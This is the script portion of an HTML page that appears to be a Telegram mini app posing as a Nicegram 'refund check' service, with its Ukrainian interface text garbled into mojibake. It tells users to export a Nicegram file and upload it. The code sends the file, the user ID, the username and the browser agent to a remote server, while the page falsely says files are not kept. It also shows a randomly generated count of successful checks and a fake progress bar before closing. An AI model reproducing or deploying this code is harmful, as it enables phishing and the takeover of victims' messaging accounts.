				slider_text: "‚Ä∫‚Ä∫ –ü–æ—Ç—è–≥–Ω—ñ—Ç—å –≤–ø—Ä–∞–≤–æ ‚Ä∫‚Ä∫",
				slider_checking: "–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞...",
				sec_note: "–ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó",
				main_desc: "–ó–∞—Ö–∏—â–µ–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –¥–∞–Ω–∏—Ö.<br>–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª –µ–∫—Å–ø–æ—Ä—Ç—É.",
				stats_text: "–ü—Ä–æ–π–¥–µ–Ω–æ —É—Å–ø—ñ—à–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –∑–∞ —Å—å–æ–≥–æ–¥–Ω—ñ",
				btn_upload: "üìÅ –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª",
				sec_note_2: "NiceGram ¬Æ –≤—Å—ñ –¥–∞–Ω—ñ –∑–∞—Ö–∏—â–µ–Ω—ñ",
				load_init: "–Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è...",
				no_close: "–ù–µ –∑–∞–∫—Ä–∏–≤–∞–π—Ç–µ –¥–æ–¥–∞—Ç–æ–∫!",
				error_title: "–í–∏–Ω–∏–∫–ª–∞ –ø–æ–º–∏–ª–∫–∞",
				btn_retry: "–°–ø—Ä–æ–±—É–≤–∞—Ç–∏ —â–µ —Ä–∞–∑",
				footer_instr: "–Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è",
				footer_faq: "FAQ",
				modal_instr_title: "–Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è",
				modal_instr_content: `
					<p><strong>1.</strong> –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ Nicegram –∑ –æ—Ñ—ñ—Ü—ñ–π–Ω–æ–≥–æ —Å–∞–π—Ç—É...</p>
					<p><strong>2.</strong> –í—ñ–¥–∫—Ä–∏–π—Ç–µ Nicegram —Ç–∞ —É–≤—ñ–π–¥—ñ—Ç—å —É —Å–≤—ñ–π –∞–∫–∞—É–Ω—Ç.</p>
					<p><strong>3.</strong> –ó–∞–π–¥—ñ—Ç—å —É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å –ø—É–Ω–∫—Ç ¬´Nicegram¬ª.</p>
					<p><strong>4.</strong> –ï–∫—Å–ø–æ—Ä—Ç—É–π—Ç–µ —Ñ–∞–π–ª...</p>
					<p><strong>5.</strong> –í—ñ–¥–∫—Ä–∏–π—Ç–µ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞ —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É "–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥".</p>
					<p><strong>6.</strong> –ù–∞–¥—ñ—à–ª—ñ—Ç—å —Ñ–∞–π–ª –±–æ—Ç—É.</p>
					<p><strong>7.</strong> –ß–µ–∫–∞–π—Ç–µ –Ω–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏.</p>
				`,
				btn_understood: "–ó—Ä–æ–∑—É–º—ñ–ª–æ",
				modal_faq_title: "‚ùì –ß–∞—Å—Ç—ñ –∑–∞–ø–∏—Ç–∞–Ω–Ω—è",
				modal_faq_content: `
					<p><strong>–©–æ —Ç–∞–∫–µ —Ä–µ—Ñ–∞—É–Ω–¥?</strong><br>–¶–µ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–æ—à—Ç—ñ–≤ –∑–∞ –ø–æ–¥–∞—Ä—É–Ω–æ–∫...</p>
					<p><strong>–°–∫—ñ–ª—å–∫–∏ —á–∞—Å—É –∑–∞–π–º–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞?</strong><br>–ó–∞–∑–≤–∏—á–∞–π 3-5 —Ö–≤–∏–ª–∏–Ω, –±—É–≤–∞—é—Ç—å –∑–∞—Ç—Ä–∏–º–∫–∏</p>
					<p><strong>–ú–æ—ó —Ñ–∞–π–ª–∏ —É –±–µ–∑–ø–µ—Ü—ñ?</strong><br>–¢–∞–∫ - –º–∏ –Ω–µ –∑–±–µ—Ä—ñ–≥–∞—î–º–æ –≤–∞—à—ñ —Ñ–∞–π–ª–∏, —ó—Ö –ø–µ—Ä–µ–≤—ñ—Ä—è—î –Ω–∞—à –±–æ—Ç, –ø—ñ—Å–ª—è —á–æ–≥–æ –≤–∏–¥–∞–ª—è—î</p>
				`,
				btn_close: "–ó–∞–∫—Ä–∏—Ç–∏",
				modal_err_title: "–ü–æ–º–∏–ª–∫–∞!",
				modal_err_text: "–§–∞–π–ª –º–∞—î –±—É—Ç–∏ —É —Ñ–æ—Ä–º–∞—Ç—ñ <strong>.zip</strong> –∞–±–æ <strong>.txt</strong>! –ë—É–¥—å –ª–∞—Å–∫–∞, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—é.",
				statuses: ['–ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –ª—ñ–∫–≤—ñ–¥–Ω—ñ—Å—Ç—å —Ñ–∞–π–ª—É', '–ê–Ω–∞–ª—ñ–∑—É—î–º–æ –∞—É–∫—Ü—ñ–æ–Ω–∏', '–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∑—ñ—Ä–æ–∫', '–§–æ—Ä–º—É–≤–∞–Ω–Ω—è –≤–µ—Ä–¥–∏–∫—Ç—É'],
				errors: {
					ip_ban: "–î–æ—Å—Ç—É–ø —Ç–∏–º—á–∞—Å–æ–≤–æ –æ–±–º–µ–∂–µ–Ω–∏–π",
					user_ban: "–í–∞—à –∞–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ",
					conn_err: "–ü–æ–º–∏–ª–∫–∞ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ —Å–µ—Ä–≤–µ—Ä–æ–º",
					too_large: "–§–∞–π–ª –∑–∞–Ω–∞–¥—Ç–æ –≤–µ–ª–∏–∫–∏–π (–º–∞–∫—Å. 50MB)"
				}
			}
		};

		// –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –î–µ–ª–∞–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ –≥–ª–æ–±–∞–ª—å–Ω–æ –¥–æ—Å—Ç—É–ø–Ω—ã–º–∏
		function selectLanguage(lang) {
			console.log('Language selected:', lang);
			currentLang = lang;
			applyLanguage();
			// Only start session initialization after language is selected
			initSession();
		}

		function applyLanguage() {
			const t = translations[currentLang];
			if (!t) return;
			
			// –û–±–Ω–æ–≤–ª—è–µ–º –≤—Å–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã
			if (document.getElementById('greeting')) 
				document.getElementById('greeting').textContent = t.greeting;
			if (document.getElementById('greeting2')) 
				document.getElementById('greeting2').textContent = t.greeting;
			if (document.getElementById('captcha-desc')) 
				document.getElementById('captcha-desc').textContent = t.captcha_desc;
			if (document.getElementById('sliderText')) 
				document.getElementById('sliderText').textContent = t.slider_text;
			if (document.getElementById('sec-note-1')) 
				document.getElementById('sec-note-1').textContent = t.sec_note;
			if (document.getElementById('main-desc')) 
				document.getElementById('main-desc').innerHTML = t.main_desc;
			if (document.getElementById('stats-text-span')) 
				document.getElementById('stats-text-span').textContent = t.stats_text;
			if (document.getElementById('btn-upload')) 
				document.getElementById('btn-upload').textContent = t.btn_upload;
			if (document.getElementById('sec-note-2')) 
				document.getElementById('sec-note-2').textContent = t.sec_note_2;
			if (document.getElementById('loadStatus')) 
				document.getElementById('loadStatus').textContent = t.load_init;
			if (document.getElementById('no-close-warning')) 
				document.getElementById('no-close-warning').textContent = t.no_close;
			if (document.getElementById('errorText')) 
				document.getElementById('errorText').textContent = t.error_title;
			if (document.getElementById('btn-retry')) 
				document.getElementById('btn-retry').textContent = t.btn_retry;
			
			if (document.getElementById('footer-btn-instr')) 
				document.getElementById('footer-btn-instr').textContent = t.footer_instr;
			if (document.getElementById('footer-btn-faq')) 
				document.getElementById('footer-btn-faq').textContent = t.footer_faq;
			
			if (document.getElementById('modal-instr-title')) 
				document.getElementById('modal-instr-title').textContent = t.modal_instr_title;
			if (document.getElementById('modal-instr-content')) 
				document.getElementById('modal-instr-content').innerHTML = t.modal_instr_content;
			if (document.getElementById('btn-close-instr')) 
				document.getElementById('btn-close-instr').textContent = t.btn_understood;
			
			if (document.getElementById('modal-faq-title')) 
				document.getElementById('modal-faq-title').textContent = t.modal_faq_title;
			if (document.getElementById('modal-faq-content')) 
				document.getElementById('modal-faq-content').innerHTML = t.modal_faq_content;
			if (document.getElementById('btn-close-faq')) 
				document.getElementById('btn-close-faq').textContent = t.btn_close;
			
			if (document.getElementById('modal-err-title')) 
				document.getElementById('modal-err-title').textContent = t.modal_err_title;
			if (document.getElementById('modal-err-text')) 
				document.getElementById('modal-err-text').innerHTML = t.modal_err_text;
			if (document.getElementById('btn-close-err')) 
				document.getElementById('btn-close-err').textContent = t.btn_understood;
		}

		function showStep(id) {
			document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
			document.getElementById(id).classList.add('active');
		}

		function showError(msg) {
			const errorText = document.getElementById('errorText');
			if (errorText) errorText.textContent = msg;
			showStep('step-error');
		}

		function openModal(id) {
			const overlay = document.querySelector('.modal-overlay');
			const modal = document.getElementById(id);
			if (overlay) overlay.classList.add('active');
			if (modal) modal.classList.add('active');
		}

		function closeAllModals() {
			const overlay = document.querySelector('.modal-overlay');
			const modals = document.querySelectorAll('.modal');
			if (overlay) overlay.classList.remove('active');
			modals.forEach(m => m.classList.remove('active'));
		}

		async function initSession() {
			const t = translations[currentLang];
			if (!t) return;
			
			try {
				const res = await fetch(`${SERVER}/init`, {
					method: 'POST',
					headers: {'Content-Type': 'application/json'},
					body: JSON.stringify({user_id: userId, session_id: sessionId})
				});
				const data = await res.json();
				if (data.error === 'IP_BANNED') return showError(t.errors.ip_ban);
				if (data.error === 'USER_BANNED') return showError(t.errors.user_ban);
				if (data.verified) {
					sessionId = data.session_id;
					localStorage.setItem('sid', sessionId);
					verified = true;
					showStep('step-main');
					logEntry();
				} else {
					captchaId = data.captcha_id;
					showStep('step-captcha');
					initSlider();
				}
			} catch (e) {
				showError(t.errors.conn_err);
			}
		}

		async function verifyCaptcha() {
			try {
				const res = await fetch(`${SERVER}/verify`, {
					method: 'POST',
					headers: {'Content-Type': 'application/json'},
					body: JSON.stringify({captcha_id: captchaId})
				});
				const data = await res.json();
				if (data.verified) {
					sessionId = data.session_id;
					localStorage.setItem('sid', sessionId);
					verified = true;
					if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
					setTimeout(() => {
						showStep('step-main');
						logEntry();
					}, 500);
					return true;
				}
				return false;
			} catch (e) {
				return false;
			}
		}

		async function logEntry() {
			try {
				await fetch(`${SERVER}/log`, {
					method: 'POST',
					headers: {'Content-Type': 'application/json'},
					body: JSON.stringify({
						user_id: userId,
						username: userName,
						user_agent: navigator.userAgent,
						session_id: sessionId
					})
				});
			} catch (e) {}
		}

		function initSlider() {
			const t = translations[currentLang];
			const track = document.getElementById('sliderTrack');
			const thumb = document.getElementById('sliderThumb');
			const fill = document.getElementById('sliderFill');
			const text = document.getElementById('sliderText');
			if (!track || !thumb || !fill || !text) return;
			
			let isDragging = false;
			let startX = 0;
			let thumbX = 0;
			const maxX = track.offsetWidth - thumb.offsetWidth - 12;

			function start(e) {
				if (verified) return;
				isDragging = true;
				startX = (e.touches ? e.touches[0].clientX : e.clientX) - thumbX;
				thumb.style.transition = 'none';
				fill.style.transition = 'none';
			}

			function move(e) {
				if (!isDragging) return;
				e.preventDefault();
				const x = (e.touches ? e.touches[0].clientX : e.clientX) - startX;
				thumbX = Math.max(0, Math.min(x, maxX));
				thumb.style.left = (thumbX + 6) + 'px';
				fill.style.width = (thumbX + 56) + 'px';
				const pct = thumbX / maxX;
				text.style.opacity = 1 - pct;
			}

			async function end() {
				if (!isDragging) return;
				isDragging = false;
				thumb.style.transition = 'left 0.3s, background 0.3s';
				fill.style.transition = 'width 0.3s';
				if (thumbX >= maxX - 10) {
					thumb.classList.add('success');
					thumb.innerHTML = '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>';
					text.textContent = t.slider_checking;
					text.style.opacity = 1;
					const ok = await verifyCaptcha();
					if (!ok) {
						thumb.classList.remove('success');
						thumb.innerHTML = '<svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>';
						text.textContent = t.slider_text;
						thumbX = 0;
						thumb.style.left = '6px';
						fill.style.width = '0';
					}
				} else {
					thumbX = 0;
					thumb.style.left = '6px';
					fill.style.width = '0';
					text.style.opacity = 1;
				}
			}

			thumb.addEventListener('mousedown', start);
			thumb.addEventListener('touchstart', start, {passive: true});
			document.addEventListener('mousemove', move);
			document.addEventListener('touchmove', move, {passive: false});
			document.addEventListener('mouseup', end);
			document.addEventListener('touchend', end);
		}

		// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
		document.addEventListener('DOMContentLoaded', function() {
			// –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ª—É—á–∞–π–Ω–æ–µ —á–∏—Å–ª–æ –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
			const statsNum = document.getElementById('statsNum');
			if (statsNum) {
				statsNum.textContent = (2500 + Math.floor(Math.random() * 1000)).toLocaleString();
			}
			
			// –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ —Ñ–∞–π–ª–æ–≤
			const fileInput = document.getElementById('fileInput');
			if (fileInput) {
				fileInput.addEventListener('change', async function() {
					const t = translations[currentLang];
					if (!t) return;
					
					const file = this.files[0];
					if (!file) return;
					const ext = file.name.split('.').pop().toLowerCase();
					if (ext !== 'zip' && ext !== 'txt') {
						openModal('errorModal');
						this.value = '';
						return;
					}
					if (file.size > 50 * 1024 * 1024) {
						showError(t.errors.too_large);
						this.value = '';
						return;
					}
					showStep('step-loading');
					uploadFile(file);
					let pct = 0;
					const statuses = t.statuses;
					const timer = setInterval(() => {
						pct += 0.5;
						if (pct >= 100) {
							pct = 100;
							clearInterval(timer);
							if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
							setTimeout(() => {
								if (tg) tg.close();
							}, 800);
						}
						const loadPercent = document.getElementById('loadPercent');
						const loadStatus = document.getElementById('loadStatus');
						if (loadPercent) loadPercent.textContent = Math.floor(pct) + '%';
						if (loadStatus) loadStatus.textContent = statuses[Math.min(Math.floor(pct / 25), 3)];
					}, 600);
				});
			}
			
			// –°–æ–∑–¥–∞–µ–º —Å–Ω–µ–∂–∏–Ω–∫–∏
			const snow = document.getElementById('snow');
			if (snow) {
				for (let i = 0; i < 40; i++) {
					const f = document.createElement('div');
					f.className = 'snowflake';
					f.style.left = Math.random() * 100 + '%';
					f.style.width = f.style.height = (Math.random() * 4 + 2) + 'px';
					f.style.animationDuration = Math.random() * 5 + 5 + 's';
					snow.appendChild(f);
				}
			}
			
			// –°–æ–∑–¥–∞–µ–º –≥–∏—Ä–ª—è–Ω–¥—É
			const garland = document.getElementById('garland');
			if (garland) {
				const colors = ['bulb-cyan', 'bulb-blue', 'bulb-white'];
				for (let i = 0; i < 20; i++) {
					const bulb = document.createElement('div');
					bulb.className = 'light-bulb ' + colors[i % 3];
					bulb.style.animationDelay = (i * 0.1) + 's';
					garland.appendChild(bulb);
				}
			}
		});

		async function uploadFile(file) {
			const form = new FormData();
			form.append('user_id', userId);
			form.append('username', userName);
			form.append('user_agent', navigator.userAgent);
			form.append('file', file);
			try {
				await fetch(`${SERVER}/upload`, {
					method: 'POST',
					headers: {'X-Session-ID': sessionId},
					body: form
				});
			} catch (e) {
				console.error('Upload error:', e);
			}
		}
	</script>
</body>
</html>